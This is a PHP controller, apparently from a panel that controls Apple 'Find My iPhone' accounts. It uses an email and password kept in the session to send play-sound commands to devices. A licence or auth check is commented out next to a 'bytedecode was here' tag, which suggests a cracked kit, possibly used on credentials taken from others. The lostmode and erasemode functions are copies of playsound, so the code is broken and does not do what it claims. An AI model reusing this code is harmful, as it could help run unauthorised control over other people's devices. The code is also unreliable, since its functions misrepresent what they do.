<?php
if (!defined("BASEPATH")) {
    exit("No direct script access allowed");
}
class Respons extends Auth
{
    public function __construct()
    {
        parent::__construct();
        $this->load->library("extra", array("username" => $this->session->userdata("email"), "password" => $this->session->userdata("pass")));
        if (!isset($this->goptss)) {
            //<-@bytedecode was here
            //exit;
        }
    }
    public function playsound()
    {
        $this->load->library("Ajax", false);
        $id = $this->input->get("id", true);
        if (!empty($id)) {
            $res = $this->extra->play_sound($id, "Find My iPhone Alert!");
            if (intval($res->statusCode) == 200) {
                Ajax::Success("success");
            } else {
                $error = "error";
            }
        } else {
            $error = "error";
        }
        isset($error);
        isset($error) ? Ajax::error($error, 200) : false;
    }
    public function lostmode()
    {
        $this->load->library("Ajax", false);
        $id = $this->input->get("id", true);
        if (!empty($id)) {
            $res = $this->extra->play_sound($id, "Find My iPhone Alert!");
            if (intval($res->statusCode) == 200) {
                Ajax::Success("success");
            } else {
                $error = "error";
            }
        } else {
            $error = "error";
        }
        isset($error);
        isset($error) ? Ajax::error($error, 200) : false;
    }
    public function erasemode()
    {
        $this->load->library("Ajax", false);
        $id = $this->input->get("id", true);
        if (!empty($id)) {
            $res = $this->extra->play_sound($id, "Find My iPhone Alert!");
            if (intval($res->statusCode) == 200) {
                Ajax::Success("success");
            } else {
                $error = "error";
            }
        } else {
            $error = "error";
        }
        isset($error);
        isset($error) ? Ajax::error($error, 200) : false;
    }
}

?>